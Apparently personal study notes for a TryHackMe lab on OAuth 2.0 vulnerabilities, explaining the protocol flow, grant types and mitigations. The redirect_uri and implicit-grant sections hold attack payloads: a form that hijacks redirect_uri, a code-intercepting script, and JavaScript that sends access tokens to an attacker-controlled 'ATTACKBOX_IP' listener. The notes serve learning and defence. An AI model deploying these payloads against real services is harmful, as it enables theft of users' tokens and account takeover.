https://tryhackme.com/room/oauthvulnerabilities

### Table of contents
- [[#Key Concepts]]
- [[#OAuth Grant Types]]
- [[#OAuth Flow]]
- [[#Identifying OAuth Services]]
- [[#Stealing OAuth Token]]
- [[#CSRF]]
- [[#Implicit Grant Flow]]
- 

___
### Key Concepts
[[#Table of contents|Back to the top]]

##### Resource Owner
Person or system that controls certain data and can access app to access data
##### Client
Mobile app or server-side web app, acts as intermediary between user and owner
##### Authorization Server
Issues access tokens to client after successful authentication with resource owner
##### Resource Server
Hosts protected resources, accepts and responds to protected resource requests using access tokens
##### Authorization Grant
Means through which client obtains access token
Grant types: Authorization Code, Implicit, Resource Owner Password Credentials, Client Credentials
##### Access Token
Credential used by client to access protected resources, limited lifespan and scope
Prevents from repeatedly asking for credentials to resource owner
##### Refresh Token
Credential used by client without requiring resource owner to re-authenticate
##### Redirect URI
URI to which authorization server redirects resource owner's user-agent after grant/denial of authorization
##### Scope
Resource owner grants/denies, limit app's access to user's account, enforce principle of least privilege
##### State Parameter
Optional parameter maintains state between client and authorization server, prevents CSRF (cross-site request forgery)
##### Token & Authorization Endpoint
- Authorization server's endpoint: client exchanges authorization grant (/refresh token) for access token
- Authorization endpoint: resource owner is authenticated and authorizes client to access protected resources.

___
### OAuth Grant Types
[[#Table of contents|Back to the top]]

##### Authorization Code
Most commonly used for server-side apps (PHP, JAVA, .NET, ...)
![[Pasted image 20251026151727.png]]
##### Implicit Grant
Designed for mobile and web apps where clients can't securely store secrets, directly issues access token without requiring authorization code exchange
Less secure as it exposes access token which can be logged in browser history, doesn't support refresh tokens
![[Pasted image 20251026151917.png]]
##### Resource Owner Password Credentials
Client is highly trusted by resource owner (1st party app)
![[Pasted image 20251026152122.png]]
##### Client Credentials
Server-to-server interactions without user involvement
![[Pasted image 20251026152255.png]]
___
### OAuth Flow
[[#Table of contents|Back to the top]]

![[Pasted image 20251026152557.png]]
1. **Authorization Request**
a) Tom wants to use [http://bistro.thm:8000/oauthdemo](http://bistro.thm:8000/oauthdemo), where he wants to log in via CoffeeShopApp
b) App redirects Tom to authorization server with authorization request
--> `http://coffee.thm:8000/o/authorize/?client_id=zlurq9lseKqvHabNqOc2DkjChC000QJPQ0JvNoBt&response_type=code&redirect_uri=http://bistro.thm:8000/oauthdemo/callback`
- `response_type=code`: `CoffeeShopApp` is expecting authorization code
- `client_id`: public identifier for client application, uniquely identifying `CoffeeShopApp`
- `redirect_uri`: URL where authorization server will send Tom after he grants permission, must match one of the pre-registered redirect URIs for client app
- `scope`: specifies level of access requested

```python
def oauth_login(request):
	app = Application.objects.get(name="CoffeeApp")
	redirect_uri = request.GET.get("redirect_uri", "http://bistro.thm:8000/oauthdemo/callback")
	authorization_url = (
		f"http://coffee.thm:8000/o/authorize/?client_id={app.client_id}&response_type=code&redirect_uri={redirect_uri}"
		)
	return redirect(authorization_url)
```

2. **Authentication & Authorization**
Tom reaches authorization server, prompted to log in using credentials
Successful login --> authorization server asks Tom if he agrees to grant bistro app access

3. **Authorization Response**
Tom agrees to grant access, authorization server generates authorization code
Server redirects Tom to bistro website using `redirect_uri`

4. **Token Request**
Bistro website exchanges authorization code for access token by requesting authorization server's token endpoint through POST request with
- `grant_type`: type of grant being used; usually set as `code` to specify authorization code
- `code`: authorization code received from authorization server
- `redirect_uri`: must match original redirect URI provided in authorization request
- `client_id and client_secret`: credentials for authenticating client application

```python
token_url = "http://coffee.thm:8000/o/token/"
	client_id = Application.objects.get(name="CoffeeApp").client_id
	client_secret = Application.objects.get(name="CoffeeApp").client_secret
	redirect_uri = request.GET.get("redirect_uri", "http://bistro.thm:8000/oauthdemo/callback")

	data = {
		"grant_type": "authorization_code",
		"code": code,
		"redirect_uri": redirect_uri,
		"client_id": client_id,
		"client_secret": client_secret,
		}
	headers = {
		'Content-Type': 'application/x-www-form-urlencoded',
		'Authorization': f'Basic {base64.b64encode(f"{client_id}:{client_secret}".encode()).decode()}',
		}
		
	response = requests.post(token_url, data=data, headers=headers)
	tokens = response.json()
```

Bistro app exchanges authorization code for access token
Authorization server verifies information provided and responds with access token

5. **Token Response**
Authorization server authenticates bistro website and validates authorization code, and responds with access token (and optionally refresh token)

Authorization server's response
- `access_token`
- `token_type`: typically "Bearer"
- `expires_in`: duration in seconds for which access token is valid
- `refresh_token (optional)`: token used to obtain new access tokens without requiring user to log in again

___
### Identifying OAuth Services
[[#Table of contents|Back to the top]]

Look for options to **log in using external service providers**

Analyze **network traffic**, pay attention to **HTTP redirects**: look for `response_type`, `client_id`, `redirect_uri`, `scope`, `state`

Identify framework
- **HTTP Headers and Responses**: inspect for unique identifiers / comments referencing specific OAuth libraries/frameworks
- **Source Code Analysis**: search for specific keywords, import statements that can reveal framework in use. Libraries like `django-oauth-toolkit`, `oauthlib`, `spring-security-oauth`, or `passport` in `Node.js`, have unique characteristics and naming conventions
- **Authorization and Token Endpoints**: Different OAuth implementations might have unique endpoint patterns/structures. `Django OAuth Toolkit` typically follows the pattern `/oauth/authorize/` and `/oauth/token/`
- **Error Messages**: inadvertently reveal underlying technology stack

___
### Stealing OAuth Token
[[#Table of contents|Back to the top]]

Authorization server issues OAuth Token and sends it to `redirect_uri`
--> If `redirect_uri` isn't well protected, attackers can steal tokens

--> `redirect_uri` should be registered into app so that authorization server can check if `redirect_uri` matches one of the registered URIs

*Example*

User wants to use OAuth on `http://coffee.thm:8000`

Attacker has compromised `dev.bistro.thm:8002`

Attacker creates `redirect_uri.html`
```html
<form action="http://coffee.thm:8000/oauthdemo/oauth_login/" method="get">
	<input type="hidden" name="redirect_uri" value="http://dev.bistro.thm:8002/malicious_redirect.html">
	<input type="submit" value="Hijack OAuth">
</form>
```
*makes it seem like user is redirected to `dev.bistro.thm:8002/redirect_uri.html` but actually redirects to `dev.bistro.thm:8002/malicious_redirect_uri.html`*

`malicious_redirect.html`
```HTML
<script> // Extract the authorization code from the URL
const urlParams = new URLSearchParams(window.location.search);
const code = urlParams.get('code');
document.getElementById('auth_code').innerText = code;
console.log("Intercepted Authorization Code:", code);
// code to save the acquired code in database/file etc
</script>
```
*intercepts authorization code*

Link `dev.bistro.thm:8002/redirect_uri.html` can be sent through social engineering or CSRF attack

___
### CSRF
[[#Table of contents|Back to the top]]

`state` parameter in OAuth 2.0: arbitrary string that protects against CSRF (attacker tricks user into executing action on webapp on which they are authenticated)
--> if not set / too predictable --> insecure

___
### Implicit Grant Flow
[[#Table of contents|Back to the top]]

Tokens directly returned to client without authorization code
- **Expose token in URL:** app redirects to OAuth authorization endpoint which returns access token in URL 
- **Inadequate redirect URI validation:** OAuth server doesn't validate redirect URI --> attacker can manipulate redirect URI
- **No HTTPS implementation:** no encryption
- **Improper access tokens handling:** app stores tokens insecurely (`localStorage`, `sessionStorage`) --> vulnerable to XSS

1. Run python web server: `python3 -m http.server 8081`
2. Write script
```JS
<script>
var hash = window.location.hash.substr(1);var result = hash.split('&').reduce(function (res, item) {var parts = item.split('=');res[parts[0]] = parts[1]; return res;
  }, {});
var accessToken = result.access_token;
  var img = new Image();
  img.src = 'http://ATTACKBOX_IP:8081/steal_token?token=' + accessToken;
</script>
```
	
>	*1. Extracts fragment identifier (what follows the "#")
>	2. Splits each key-value pair (`.split('&')`), then splits each key from its value (`.split('=')`)
>	3. Put access token in variable `accessToken`
>	4. Create Image object, set its source to attacker server, when image is loaded, sends token in URL*

___
#### Other Vulnerabilities
[[#Table of contents|Back to the top]]

**Insufficient Token Expiry:** too long lifetime --> short lives and refresh tokens

**Replay Attacks:** tokens can be reused by attackers --> implement `nonce` and `timestamp` values, each token can only be used once

**Insecure Token Storage:** local storage, unencrypted --> theft --> secure cookies, encrypted database

##### OAuth 2.1
- **`implicit grant type` deprecated:** exposure in URL fragment
- **`state` parameter mandatory:** against CSRF
- **Advises for secure token handling and storage:** secure cookies instead of browser local storage
- **Clearer guidelines for `redirect URI validation`, client authentication and scope validation**